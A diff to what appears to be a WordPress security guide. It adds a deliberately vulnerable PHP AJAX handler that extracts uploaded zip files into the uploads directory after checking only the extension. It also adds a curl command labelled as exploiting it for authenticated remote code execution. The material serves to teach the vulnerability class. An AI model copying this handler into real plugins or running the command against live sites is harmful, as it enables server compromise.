@@ -2825,9 +2825,38 @@ Phardata::extractTo();
 unzip_file();
 ```
 
-- Vulneravble code_:
+- Vulnerable code_:Extraction is made without sanitizing the file.A malicious zip with a php file is uploaded  and checks is only made to ensure upload of a zip file.
 
 ```php
+add_action("wp_ajax_unpack_fonts", "unpack_fonts");
+
+function unpack_fonts(){
+    $file = $_FILES["file"];
+    $ext = end(explode('.',$file["name"]));
+
+    if($ext !== "zip"){
+        die();
+    }
+
+    $file_path = WP_CONTENT_DIR . "/uploads/" . $file["name"];
+    move_uploaded_file($file["tmp_name"], $file_path);
+
+    $zip = new ZipArchive;
+    $f = $zip->open($file_path);
+
+    if($f){
+        $zip->extractTo(WP_CONTENT_DIR . "/uploads/"); //vulnerable code
+        $zip->close();
+    }
+}
+```
+
+- Exploitation [Authenticated RCE]-:
+
+```bash
+curl [URL]/wp-admin/admin-ajax.php?action=unpack_fonts -H "Cookie: <authenticated_cookie>" -F "file=@/home/user.zip"
+```
+
 
 
 
